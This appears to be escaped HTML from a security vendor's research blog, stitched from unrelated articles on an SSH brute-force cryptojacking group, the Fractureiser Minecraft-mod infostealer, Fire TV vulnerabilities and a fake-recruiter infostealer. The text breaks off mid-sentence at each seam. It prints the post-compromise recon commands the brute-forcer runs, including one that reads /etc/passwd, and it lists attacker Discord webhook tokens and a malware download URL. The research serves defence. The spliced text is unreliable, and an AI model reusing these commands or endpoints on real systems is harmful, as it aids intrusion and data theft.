loading=\"lazy\" width=\"419\" height=\"184\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EIn another step of its operation, the loader alters the shell configuration, overwriting the \u003Ccode\u003E.bashrc\u003C\u002Fcode\u003E and \u003Ccode\u003E.bash_profile\u003C\u002Fcode\u003E files. The auxiliary file \u003Ccode\u003E\u002Fusr\u002F.SQL-Unix\u002F.SQL\u002F.db\u003C\u002Fcode\u003E, used to store part of the commands, is executed via the source built-in in \u003Ccode\u003E.bashrc\u003C\u002Fcode\u003E. This script, in turn, contains commands that overwrite \u003Ccode\u003E.bashrc\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F4.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"417\" height=\"542\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ESeveral shell commands are disabled using bash aliases. The purpose of these configurations is to render the shell inoperable to other operators, whether they are competing in the realms of malware or they’re legitimate users of the system.\u003C\u002Fp\u003E\u003Cp\u003EThe attackers also try to achieve persistence so the loader drops some redundant scripts. Their names differ between versions of the loader, so we will refer to those in the \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E script:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cp\u003E· \u003Ccode\u003E.k93\u003C\u002Fcode\u003E is used to launch the miner (.k4m3l0t)\u003Cbr\u003E\n· \u003Ccode\u003E\u002Fusr\u002Fbin\u002Fsshd\u003C\u002Fcode\u003E is a \u003Ccode\u003Esystemd\u003C\u002Fcode\u003E service script that launches .k93\u003Cbr\u003E\n· \u003Ccode\u003E.5p4rk3l5\u003C\u002Fcode\u003E is a crontab file that executes \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E and \u003Ccode\u003E.k93\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003ESeveral persistence methods are employed:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cp\u003E· creating a user and adding it to the sudo group; various names are used: \u003Ccode\u003Egh0stx\u003C\u002Fcode\u003E, \u003Ccode\u003Esclipicibosu\u003C\u002Fcode\u003E, \u003Ccode\u003Emexalzsherifu\u003C\u002Fcode\u003E\u003Cbr\u003E\n· adding a SSH key to \u003Ccode\u003Eauthorized_keys\u003C\u002Fcode\u003E (attackers cycled through three different keys depending on the script)\u003Cbr\u003E\n· creating a \u003Ccode\u003Esystemd\u003C\u002Fcode\u003E service called \u003Ccode\u003Emyservice\u003C\u002Fcode\u003E which runs the \u003Ccode\u003E\u002Fusr\u002Fbin\u002Fsshd\u003C\u002Fcode\u003E script:\u003C\u002Fp\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F5.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"640\" height=\"583\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2021\u002F07\u002F5.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F5.png 640w\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003Cstrong\u003EMining for Monero\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EAll of this effort is currently directed towards Monero mining. While the current campaign concerns cryptojacking, we have connected this group to several DDoS botnets: a Demonbot variant called \u003Ccode\u003Echernobyl\u003C\u002Fcode\u003E and a Perl IRC bot.\u003C\u002Fp\u003E\u003Cp\u003EAs you all know, mining for cryptocurrency is slow and tedious, but it can go faster when using multiple systems. Owning multiple systems for mining is not cheap, so attackers try the next best thing: to remotely compromise devices and use them for mining instead.\u003C\u002Fp\u003E\u003Cp\u003EIn this case, the group uses custom compiled binaries with embedded configurations of a legitimate miner named \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fxmrig\u002Fxmrig\"\u003EXMRig\u003C\u002Fa\u003E. Typically, the JSON configuration file, which also includes the users and where the currency goes, is external. But in this compiled version, the configuration file in embedded.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F6.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1128\" height=\"166\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2021\u002F07\u002F6.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2021\u002F07\u002F6.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F6.png 1128w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F7.png\" class=\"kg-image\" alt loading=\"lazy\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003Cstrong\u003EUnfortunately, brute force still works\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EPeople are the simple reason why brute-forcing SSH credentials still works. Dedicated tools are required for this process, and, in this situation, it's something developed by the group itself.\u003C\u002Fp\u003E\u003Cp\u003EThis tool, which its author dubbed \"Diicot brute\", is contained in \u003Ccode\u003Ejack.tar.gz\u003C\u002Fcode\u003E and \u003Ccode\u003Ejuanito.tar.gz\u003C\u002Fcode\u003E archives.\u003C\u002Fp\u003E\u003Cp\u003EAs the usage string from the binary shows, it takes as command-line arguments a port, an \"API key\", number of threads, a file containing a list of IP addresses to be scanned, and a timeout value (seconds).\u003C\u002Fp\u003E\u003Cp\u003E\u003Ccode\u003ESyntax: .\u002Fbrute [ Port ] [ Key ] [ Routines ] [ IP File ] [ Timeout ]\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\u003Cp\u003EWritten in Golang, the binary was developed in a single package, which contains the following functions:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F8.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"440\" height=\"203\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EWhile most of the tools used by Mexalz can be used by themselves, the \"Diicot bruter\" is meant to operate on a SaaS (software as a service) model. The binary communicates with three servers:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Ean update server (cdn[.]arhive[.]online)\u003C\u002Fli\u003E\n\u003Cli\u003Ean API server (requests[.]arhive[.]online)\u003C\u002Fli\u003E\n\u003Cli\u003EDiscord API servers\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EThe tool requires an \"API key\", supplied as a command-line argument. The key is provided as a parameter in the API endpoints used to retrieve the user's configuration. The configuration includes the user's Discord ID, a Discord webhook where the tool's output is POSTed, and a version number (presumably, the latest version to which the user is licensed to use).\u003C\u002Fp\u003E\u003Cp\u003EThe \u003Ccode\u003Edabrute\u003C\u002Fcode\u003E and \u003Ccode\u003Ego\u003C\u002Fcode\u003E scripts contain keys of this type. Rather than random strings, they look like user names and differ between the two instances, strengthening the assumption that the owners of this toolkit are distinct individuals belonging to the same threat group that share tools among themselves.\u003C\u002Fp\u003E\u003Cp\u003EDiscord hooks are used to report on:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Ethe start and finish of the tool's execution\u003C\u002Fli\u003E\n\u003Cli\u003Esuccessful exploitations\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003ETwo types of hooks are used: user-dependent, which are retrieved from the API server using the API key, and global, which are hardcoded.\u003C\u002Fp\u003E\u003Cp\u003EThe global hooks are:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\"https:\u002F\u002Fdiscord\"\u003Ehttps:\u002F\u002Fdiscord\u003C\u002Fa\u003E[.]com\u002Fapi\u002Fwebhooks\u002F796089316517347369\u002FzRjSflkA7z9C4N9PaPWIJQFLMSKGk5iJNv9T_Z880jhLOpkQ3OEGsbdz4GsX80WwRY0g\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca href=\"https:\u002F\u002Fdiscord\"\u003Ehttps:\u002F\u002Fdiscord\u003C\u002Fa\u003E[.]com\u002Fapi\u002Fwebhooks\u002F845977569446068234\u002FggGoh-5DEpMLtIi0OKNc8z3b3MgxjZaxovL0R0dBiMsP0hnMTIkNx_JoFTLKJtbyRSx\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EThe \u003Ccode\u003Emain.remoteRun\u003C\u002Fcode\u003E function is executed in a dedicated goroutine (lightweight thread) for each (host, username, password) combination. The implementation of the SSH protocol is provided by the standard library package \u003Ccode\u003Egolang.org\u002Fx\u002Fcrypto\u002Fssh\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003EAfter a successful authentication, the following bash commands are executed in the session with the purpose of collecting system information:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cpre\u003E\u003Ccode\u003Euname -s -v -n -r -m\nuptime | grep -ohe 'up .*' | sed 's\u002F,\u002F\u002Fg' | awk '{ print $2\\&quot; \\&quot;$3 }'\nuptime | grep -ohe '[0-9.*] user[s,]'\nlscpu | sed -nr '\u002FModel name\u002F s\u002F.*:\\\\s*(.*) @ .*\u002F\\\\1\u002Fp'\nnproc --all\nnvidia-smi -q | grep \\&quot;Product Name\\&quot;\nlspci\ncut -d: -f6 \u002Fetc\u002Fpasswd | grep \\&quot;\u002Fhome\u002F\\&quot;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003ENotably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking scheme.\u003C\u002Fp\u003E\u003Cp\u003EOwing to an auto-update feature in the binaries, we managed to locate where it is hosted and gain insight into how it is distributed. The update server is set up using Github pages.\u003C\u002Fp\u003E\u003Cp\u003EThe repository is revealed by following the redirect chain:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Ecdn[.]arhive[.]online\u002Fbrute -&gt; developer60-stack.github.io\u002Fpayload.github.io\u002Fcdn\u002Fbrute\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EThe repository (github.com\u002Fdeveloper60-stack\u002Fpayload.github.io) contains:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Esetup, an example usage of the \u003Ccode\u003Ebrute\u003C\u002Fcode\u003E tool that chains the \u003Ccode\u003Ezmap\u003C\u002Fcode\u003E port scanner, a banner grabber and a stage for filtering out SSH servers that do not accept password authentication\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Ebrute\u003C\u002Fcode\u003E, the compiled The IP addresses they originate from belong to a relatively small set, which tells us that the threat actors are not yet using compromised systems to propagate the malware (worm behavior).\u003C\u002Fp\u003E\u003Cp\u003EMore information about this threat actor can be freely provided to law enforcement agencies by reaching out to draco@bitdefender.com.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EIndicators of Dated 2023-04-12, it looks like a Stage 2 sample with the C&amp;C address set to \u003Ccode\u003E127.0.0.1\u003C\u002Fcode\u003E, which leads us to believe that it was used for testing. It also includes limited functionality that currently is available in Stage 3 samples (only listening for OS commands (executed with  \u003Ccode\u003Eexec\u003C\u002Fcode\u003E) ), which reinforces our assumption that the malware was in development at that time.\u003C\u002Fp\u003E\u003Cp\u003EWe also noticed that the Java package was named differently back in April ( \u003Ccode\u003Edev.sirlennox.nekoclient\u003C\u002Fcode\u003E  instead of  \u003Ccode\u003Edev.neko.nekoclient\u003C\u002Fcode\u003E). \u003C\u002Fp\u003E\u003Cp\u003EWe also identified several executables (NekoInstaller\u002FNekoService), as described below:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003ENekoInstaller contains a Portable Executable file named NekoServices; at execution it drops the executable file in  \u003Ccode\u003EC:\\Program Files\\nekoservice\\ServiceHost.exe\u003C\u002Fcode\u003E  and adds it as a service named  \u003Ccode\u003ENekoService\u003C\u002Fcode\u003E  to run;\u003C\u002Fli\u003E\u003Cli\u003ENekoService contains a JAR file as a resource; it will download a JRE and run the JAR file; the JAR file is then dropped in  \u003Ccode\u003EC:\\Program Files\\nekoservice\\service.jar\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\u003Cli\u003Ethe JAR file seems to be a Stage 2 sample\u003C\u002Fli\u003E\u003Cli\u003Ethe MZ header compilation time for most of these samples ranges between 2023-04-20 18:20:06 and 2023-05-01 22:17:25, and just one sample was identified to be compiled on 2023-05-21 07:58:12, which means that the malware was in development in that timeframe.\u003C\u002Fli\u003E\u003Cli\u003EBased on this evidence, it seems that the attackers initially planned to distribute EXE files rather than JAR ones, but we were unable to assess whether the EXE files have been disseminated in the wild or not.\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EInitial article:\u003C\u002Fp\u003E\u003Cp\u003ESeveral Minecraft mods and plugins hosted on the CurseForge and Bukkit modding communities \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fblog\u002Fhotforsecurity\u002Ffractureiser-malware-discovered-in-minecraft-mods-spreading-uncertainty\u002F\"\u003Ehave been tainted\u003C\u002Fa\u003E with a multi-stage, multi-platform infostealer malware called Fractureiser, a \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Ffractureiser-investigation\u002Ffractureiser\u002Fblob\u002Fmain\u002Fdocs\u002Ftech.md\"\u003Epreliminary investigation\u003C\u002Fa\u003E shows.\u003C\u002Fp\u003E\u003Cp\u003ESeveral CurseForge and Bukkit accounts have been compromised and used to publish malware-rigged updates of mods and plugins without the knowledge of the original author. These mods have trickled downstream into popular modpacks that have been downloaded several million times to date.\u003C\u002Fp\u003E\u003Cp\u003EThe malware has 4 stages, labeled 0 through 3. Stage 0 is considered the modified mod or plugin to include obfuscated code that connects to \u003Ccode\u003Ehttp:\u002F\u002F85.217.144.130:8080\u002Fdl\u003C\u002Fcode\u003E to download the Stage 1 malware.\u003C\u002Fp\u003E\u003Cp\u003EThe Stage 1 malware comes in the form of a dl.jar file with a SHA-1 sum of \u003Ccode\u003Edc43c4685c3f47808ac207d1667cc1eb915b2d82\u003C\u002Fcode\u003E. The Stage 1 malware includes a mutex to prevent it from running multiple times, and it seems responsible for infecting other JAR files, establishing persistence and contacting the command and control server in preparation of Stage 2 deployment.\u003C\u002Fp\u003E\u003Cp\u003EStage 2 (lib.jar or libWebGL64.jar) acts as a downloader and updater for the final payload in Stage 3.\u003C\u002Fp\u003E\u003Cp\u003EStage 3 brings the final payload, in the form of a jar file that includes a native binary named hook.dll. Hook.dll is exposing two functionalities that are called from Java code: \u003Ccode\u003EretrieveClipboardFiles\u003C\u002Fcode\u003E - to retrieve file descriptors from the clipboard, used for the virtual machine escape technique (detailed below), as well as \u003Ccode\u003EretrieveMSACredentials\u003C\u002Fcode\u003E to retrieve Microsoft Live credentials.\u003C\u002Fp\u003E\u003Ch2 id=\"what-we-know-so-far\"\u003EWhat we know so far\u003C\u002Fh2\u003E\u003Cp\u003EThe first sample apparently dates all the way back to April 24th 2023 in the form of a Stage 0 malware with the \u003Ccode\u003E0e583c572ad823330b9e34d871fcc2df\u003C\u002Fcode\u003E hash. The first JAR (Java Archive) file lacks many of the features currently in the malware.\u003C\u002Fp\u003E\u003Cp\u003EThe malware currently affects Linux and Windows Minecraft installs and attempts to inject itself into all other eligible .jar files on the system, including those that are not part of a Minecraft mod. The malware has a complex logic to determine whether a .jar file is a candidate for infection. Upon modification of the file, the infection code also disables code signing for Java files by removing the \u003Ccode\u003EMETA-INF\u002FCERTIFIC.RSA\u003C\u002Fcode\u003E, \u003Ccode\u003EMETA-INF\u002FCERTIFIC.EC\u003C\u002Fcode\u003E, \u003Ccode\u003EMETA-INF\u002FCERT.SF\u003C\u002Fcode\u003E and \u003Ccode\u003EMETA-INF\u002FCERTIFIC.SF\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe malware monitors the clipboard for crypto-currency wallet addresses, then swaps them with the attacker’s to hijack transactions. It also steals Minecraft and Discord authentication tokens, as well as cookies and login data stored in the most popular browsers.\u003C\u002Fp\u003E\u003Cp\u003EDuring our analysis, we identified interesting behavior we believe is aimed at mod or plugin developers. It looks like the Stage 3 malware targets Windows Sandbox instances used for testing mods by monitoring and constantly poisoning the clipboard in an attempt to infect the host. This behavior is isolated to Windows Sandbox, as it is the only virtualization environment that allows alteration of the host clipboard contents when the virtual machine is running in the background.\u003C\u002Fp\u003E\u003Cp\u003EWe were able to confirm that dozens of mods and plugins have been rigged with the malware. The affected mods are listed in the Indicators of Compromise section below.\u003C\u002Fp\u003E\u003Cp\u003EThe overwhelming majority of victims are in the US. We are monitoring the individual components of this malware and will update the threat distribution accordingly.\u003C\u002Fp\u003E\u003Ch2 id=\"mitigation\"\u003EMitigation\u003C\u002Fh2\u003E\u003Cp\u003EBitdefender identifies the malicious code in all stages of execution as \u003Ccode\u003ETrojan.Java.Fractureiser.*\u003C\u002Fcode\u003E. If you have downloaded any of the infected mods in recent months or have any concern about the integrity of your .jar files, run a deep scan with your favorite security solution such as \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fsolutions\u002Ftotal-security.html\"\u003EBitdefender Total Security\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\u003Ch2 id=\"indicators-of-compromise\"\u003EIndicators of compromise\u003C\u002Fh2\u003E\u003Cp\u003E\u003Cstrong\u003EFiles\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003C!--kg-card-begin: Portable, frequently updated and relatively inexpensive when compared to a new smart TV, these devices offer a convenient, cost-effective, and customizable way to access a vast selection of content from the comfort of your own home. Smart TVs and streaming devices account for \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fblog\u002Fhotforsecurity\u002Fa-smart-device-in-your-home-is-extremely-unsafe-iot-report-finds\u002F\"\u003Ea whopping 20%\u003C\u002Fa\u003E [pdf] of all connected IoT devices, and potential vulnerabilities in firmware could affect a significant user base.\u003C\u002Fp\u003E\u003Cp\u003EAs the creator of the world’s first smart home cybersecurity hub, Bitdefender regularly audits popular IoT hardware for vulnerabilities that might affect customers if left unaddressed. This research paper is part of a broader program and aims to shed light on the security of the world’s best-sellers in the IoT space. This report covers the Amazon Fire TV Stick and the Insignia\u003Cbr\u003EFireOS TV products. The research discloses vulnerabilities affecting the following products and versions:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EInsignia TV with FireOS versions before \u003Ccode\u003E6.2.9.5\u003C\u002Fcode\u003E \u003C\u002Fli\u003E\u003Cli\u003EFire TV Stick 3rd gen. with FireOS versions before \u003Ccode\u003E7.6.3.3\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003E\u003Cstrong\u003ENote: the vulnerabilities presented in this report have been responsibly disclosed to the vendor through their Bug Bounty program. Amazon has released fixes for these issues on Fire TV devices and the Fire TV remote app, and the company has no evidence that this issue has been used against customers. Bitdefender has been working closely with the Amazon Fire TV team through all stages of vulnerability disclosure. We would like to extend our thanks for the prompt response time, communication, transparency and escalation.\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Ch3 id=\"vulnerabilities-at-a-glance\"\u003EVulnerabilities at a glance\u003C\u002Fh3\u003E\u003Cul\u003E\u003Cli\u003EUnauthorized authentication through local network PIN brute forcing. This vulnerability was caused by improper implementation of the Password Authenticated Key Exchange by Juggling (or J-PAKE) protocol that could have resulted in attackers gaining control of the device. (\u003Ca href=\"https:\u002F\u002Fcve.mitre.org\u002Fcgi-bin\u002Fcvename.cgi?name=CVE-2023-1385\"\u003ECVE-2023-1385\u003C\u002Fa\u003E)\u003C\u002Fli\u003E\u003Cli\u003EA vulnerability in the setMediaSource function on the amzn.thin.pl service allowed for arbitrary Javascript code to be executed. It could be used to load arbitrary HTTP URLs in the webview. (\u003Ca href=\"https:\u002F\u002Fcve.mitre.org\u002Fcgi-bin\u002Fcvename.cgi?name=CVE-2023-1384\"\u003ECVE-2023-1384\u003C\u002Fa\u003E)\u003C\u002Fli\u003E\u003Cli\u003EA vulnerability in the exchangeDeviceServices function on the amzn.dmgr service allowed an attacker to register services that are only locally accessible. (\u003Ca href=\"https:\u002F\u002Fcve.mitre.org\u002Fcgi-bin\u002Fcvename.cgi?name=CVE-2023-1383\"\u003ECVE-2023-1383\u003C\u002Fa\u003E)\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Ch3 id=\"disclosure-timeline\"\u003EDisclosure timeline\u003C\u002Fh3\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cul\u003E\u003Cli\u003EDec 16, 2022 - Bitdefender researchers submit the findings to the bug bounty program\u003C\u002Fli\u003E\u003Cli\u003EDec 19, 2022: Bug bounty program submits the report for vendor to review\u003C\u002Fli\u003E\u003Cli\u003EDec 20, 2022: Amazon team acknowledges the findings and starts an internal investigation\u003C\u002Fli\u003E\u003Cli\u003EApr 12, 2023: Amazon delivers the fix to the public\u003C\u002Fli\u003E\u003Cli\u003EApr 13, 2023: A bounty is awarded for the findings\u003C\u002Fli\u003E\u003Cli\u003EMay 2, 2023: This report is published as part of the coordinated disclosure\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003C!--kg-card-begin: html--\u003E\u003Cp align=\"center\"\u003E\u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Ffiles\u002FNews\u002FCaseStudies\u002Fstudy\u002F430\u002FBitdefender-PR-Whitepaper-AMZFr-creat6696-en-EN.pdf\" class=\"button-view-all d-inline-block\"\u003EDownload the research paper\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003C!--kg-card-end: html--\u003E\u003Ch3 id=\"best-practices-for-iot-devices\"\u003EBest practices for IoT devices\u003C\u002Fh3\u003E\u003Cp\u003EHome users should closely monitor IoT devices and isolate them as much as possible from the local network. This can be done by setting up a dedicated network exclusively for IoT devices.\u003C\u002Fp\u003E\u003Cp\u003EAdditionally, IoT users can use the \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fsolutions\u002Fhome-scanner.html\"\u003Efree Bitdefender Smart Home Scanner\u003C\u002Fa\u003E app to scan for connected devices, identify and highlight vulnerable ones. IoT device owners should also make sure that they check for newer firmware and update devices as soon as the vendor releases new versions.\u003C\u002Fp\u003E\u003Cp\u003ETo minimize risks of From fake job offers and elaborate phishing schemes to scams and even state-sponsored threat actors who prey on people’s career aspirations and trust in professional networks.\u003C\u002Fp\u003E\u003Cp\u003ETo shed light on such scenarios, this article delves into the deceptive tactics of a failed \"recruitment\" operation on LinkedIn, where the attackers made one critical mistake: they targeted a Bitdefender researcher who quickly uncovered their malicious intent.\u003C\u002Fp\u003E\u003Ch3 id=\"the-setup-a-tempting-job-offer\"\u003EThe Setup: A Tempting Job Offer\u003C\u002Fh3\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe scam begins with an enticing message: an opportunity to collaborate on a decentralized cryptocurrency exchange. While the details are left deliberately vague, the promise of remote work, part-time flexibility, and reasonable pay can lure unsuspecting individuals. Variations of this scam have also been observed, with projects supposedly related to travel or financial domains.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F1--1---1-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"405\" height=\"354\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cp\u003EOnce the target expresses interest, the \"hiring process\" unfolds, with the scammer requesting a CV or even a personal GitHub repository link. Although seemingly innocent, these requests can serve nefarious purposes, such as harvesting personal data or lending a veneer of legitimacy to the interaction.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F2--1---1-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"302\" height=\"112\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe submitted files provided by the “applicant” are most definitely put to good use by the “recruiter” who can harvest information and use it to further legitimize the conversation with the unsuspecting victim.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F3--1---1-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"433\" height=\"161\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Ch3 id=\"the-trap-running-the-malicious-code\"\u003EThe Trap: Running the Malicious Code\u003C\u002Fh3\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cp\u003EAfter receiving the requested information, the criminal shares a repository containing the \"minimum viable product\" (MVP) of the project. He also includes a document with questions that can only be answered by executing the demo.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F4--1---1-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"382\" height=\"394\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F5--1-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"388\" height=\"392\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EAt first glance, the code appears harmless. However, closer inspection reveals a heavily obfuscated script that dynamically loads malicious code from a third-party endpoint.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F6--1-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"602\" height=\"83\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2025\u002F02\u002F6--1-.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F6--1-.png 602w\"\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F7.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"602\" height=\"78\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2025\u002F02\u002F7.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002F7.png 602w\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cp\u003EOur researchers noted that the payload is a cross-platform info-stealer that can be deployed on Windows, MacOS and Linux operating systems. This infostealer is engineered to target a range of popular cryptocurrency wallets by looking up for the crypto-related browsing extensions with the following IDs:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002Fimage.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"975\" height=\"670\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2025\u002F02\u002Fimage.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2025\u002F02\u002Fimage.png 975w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EOnce deployed, the stealer collects important files corresponding to these extensions while also collecting login data of the used browsers and exfiltrates the information to a malicious IP address that seems to contain other malicious files on the server. After exfiltrating login and extension-related data, the JavaScript stealer downloads and executes a Python script named main99_65.py that sets the stage for other malicious 